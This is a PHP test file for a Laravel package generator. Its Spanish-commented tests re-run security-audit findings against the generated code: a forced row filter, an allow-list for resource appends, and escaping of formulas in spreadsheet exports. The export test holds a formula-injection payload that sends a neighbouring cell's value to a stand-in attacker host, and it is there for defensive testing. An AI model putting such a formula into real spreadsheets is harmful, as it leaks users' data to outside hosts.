<?php

namespace Innoboxrr\LarapackGenerator\Tests\Feature;

use Acme\Vault\Http\Resources\Models\DocumentResource;
use Acme\Vault\Models\Document;
use Illuminate\Container\Container;
use Illuminate\Http\Request;
use Illuminate\Translation\ArrayLoader;
use Illuminate\Translation\Translator;
use Innoboxrr\LarapackGenerator\Tests\Support\FakeProject;
use Innoboxrr\LarapackGenerator\Tests\TestCase;
use Maatwebsite\Excel\DefaultValueBinder as ExcelValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Cell\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Reader\Html;
use Symfony\Component\Console\Command\Command;

/**
 * Lo que la auditoría de seguridad encontró en el código generado, ejecutado
 * y no sólo leído: cada prueba reproduce el ataque contra la clase generada.
 */
final class GeneratedSecurityTest extends TestCase
{
    /** @var (callable(string): void)|null */
    private $autoloader = null;

    private bool $boundTranslator = false;

    protected function setUp(): void
    {
        parent::setUp();

        $this->useProject(FakeProject::library('Acme\\Vault\\'));

        $path = $this->project->path.'/laraimport.json';

        file_put_contents($path, json_encode(['models' => [
            ['name' => 'Document', 'props' => [
                ['name' => 'title', 'type' => 'string', 'datatable' => true],
            ]],
        ]]));

        $this->assertSame(
            Command::SUCCESS,
            $this->runCommand('larapack:import', ['jsonPath' => $path]),
            "larapack:import terminó con error:\n".$this->lastOutput
        );

        $source = $this->project->path.'/src/';

        $this->autoloader = static function (string $class) use ($source): void {
            if (str_starts_with($class, 'Acme\\Vault\\')) {
                $file = $source.str_replace('\\', '/', substr($class, strlen('Acme\\Vault\\'))).'.php';

                if (is_file($file)) {
                    require_once $file;
                }
            }
        };

        spl_autoload_register($this->autoloader);
    }

    protected function tearDown(): void
    {
        if ($this->autoloader !== null) {
            spl_autoload_unregister($this->autoloader);
        }

        if ($this->boundTranslator) {
            Container::getInstance()->forgetInstance('translator');
        }

        Cell::setValueBinder(new DefaultValueBinder);

        parent::tearDown();
    }

    public function test_todo_el_php_generado_compila(): void
    {
        $this->assertGeneratedPhpCompiles();
    }

    // INDEX: LA RESTRICCIÓN DE ManagedFilter NO ES OPCIONAL

    /**
     * Managed::apply() no acota nada si la petición no trae `managed`. Quien
     * lo omitía, o mandaba `managed=false`, listaba también las filas que
     * canView() le oculta.
     */
    public function test_el_index_fuerza_managed_aunque_el_cliente_lo_omita_o_lo_apague(): void
    {
        foreach ([[], ['managed' => 'false'], ['managed' => '0']] as $query) {
            $request = $this->prepared('Acme\\Vault\\Http\\Requests\\Document\\IndexRequest', $query);

            $this->assertTrue(
                $request->boolean('managed'),
                'El index deja al cliente saltarse ManagedFilter con '.json_encode($query)
            );
        }
    }

    public function test_el_index_deja_al_cliente_el_resto_de_filtros(): void
    {
        $request = $this->prepared('Acme\\Vault\\Http\\Requests\\Document\\IndexRequest', ['ids' => [1, 2], 'orderBy' => 'id']);

        $this->assertSame([1, 2], $request->input('ids'));
        $this->assertSame('id', $request->input('orderBy'));
    }

    // RESOURCE: EL CLIENTE NO ELIGE QUÉ ACCESSORS SE EJECUTAN

    public function test_el_resource_ignora_los_appends_que_no_declara(): void
    {
        $payload = $this->resourcePayload(
            'Acme\\Vault\\Http\\Resources\\Models\\DocumentResource',
            ['appends' => ['internal_url']]
        );

        $this->assertArrayNotHasKey('internal_url', $payload);
        $this->assertSame('Informe', $payload['title']);
    }

    /**
     * Antes un nombre que no era un accessor llegaba a setAppends() y el
     * toArray() lanzaba: cualquiera tumbaba el listado con un 500.
     */
    public function test_un_append_desconocido_no_rompe_la_respuesta(): void
    {
        $payload = $this->resourcePayload(
            'Acme\\Vault\\Http\\Resources\\Models\\DocumentResource',
            ['appends' => ['no_existe', ['anidado']]]
        );

        $this->assertArrayNotHasKey('no_existe', $payload);
    }

    public function test_el_resource_sirve_los_appends_que_declara(): void
    {
        $resource = new class(null) extends DocumentResource
        {
            protected array $appendable = ['internal_url'];
        };

        $payload = $this->resourcePayload($resource::class, ['appends' => ['internal_url', 'otra']]);

        $this->assertSame('https://interno/1', $payload['internal_url']);
        $this->assertArrayNotHasKey('otra', $payload);
    }

    // EXPORT: LO QUE ESCRIBIÓ UN USUARIO NO SE CONVIERTE EN FÓRMULA

    public function test_la_exportacion_guarda_como_texto_lo_que_empieza_por_igual(): void
    {
        $class = 'Acme\\Vault\\Exports\\DocumentsExports';

        // El de Laravel Excel, que es el que usa por omisión: no el de
        // PhpSpreadsheet, que no pasa los arrays a JSON.
        $this->assertTrue(is_subclass_of($class, ExcelValueBinder::class));

        Cell::setValueBinder(new $class([]));

        $sheet = (new Html)->loadFromString(
            '<table><tr><td>=HYPERLINK("https://evil.test/?d="&amp;B1,"Ver")</td><td>=1+1</td><td>42</td><td>texto</td></tr></table>'
        )->getActiveSheet();

        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('A1')->getDataType());
        $this->assertSame('=HYPERLINK("https://evil.test/?d="&B1,"Ver")', $sheet->getCell('A1')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('B1')->getDataType());

        // El resto se tipa como siempre.
        $this->assertSame(DataType::TYPE_NUMERIC, $sheet->getCell('C1')->getDataType());
        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('D1')->getDataType());
    }

    // AYUDAS

    /**
     * La request tal como la deja prepareForValidation(), que es lo que ve
     * handle() después.
     *
     * @param  array<string, mixed>  $query
     */
    private function prepared(string $class, array $query): Request
    {
        $request = $class::create('/', 'GET', $query);

        $method = new \ReflectionMethod($request, 'prepareForValidation');
        $method->invoke($request);

        return $request;
    }

    /**
     * @param  array<string, mixed>  $query
     * @return array<string, mixed>
     */
    private function resourcePayload(string $resourceClass, array $query): array
    {
        $container = Container::getInstance();

        if (! $container->bound('translator')) {
            $container->instance('translator', new Translator(new ArrayLoader, 'en'));
            $this->boundTranslator = true;
        }

        $document = new class extends Document
        {
            protected $table = 'documents';

            public function getInternalUrlAttribute(): string
            {
                return 'https://interno/'.$this->id;
            }
        };

        $document->forceFill(['id' => 1, 'title' => 'Informe']);

        return (new $resourceClass($document))->toArray(Request::create('/', 'GET', $query));
    }
}
